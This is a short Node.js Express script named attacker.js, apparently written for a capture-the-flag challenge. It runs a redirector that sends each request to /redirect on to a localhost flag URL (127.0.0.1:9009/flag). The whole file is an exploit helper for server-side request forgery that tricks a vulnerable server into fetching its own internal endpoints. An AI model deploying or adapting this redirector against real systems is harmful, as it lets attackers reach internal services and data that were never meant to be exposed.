// attacker.js
const express = require('express');
const app = express();
const port = 8000; // use 80 or any reachable port

app.get('/redirect', (req, res) => {
  // Redirect to the target's localhost flag URL
  res.redirect('http://127.0.0.1:9009/flag');
});

app.listen(port, () => console.log(`Attacker redirector running on :${port}`));
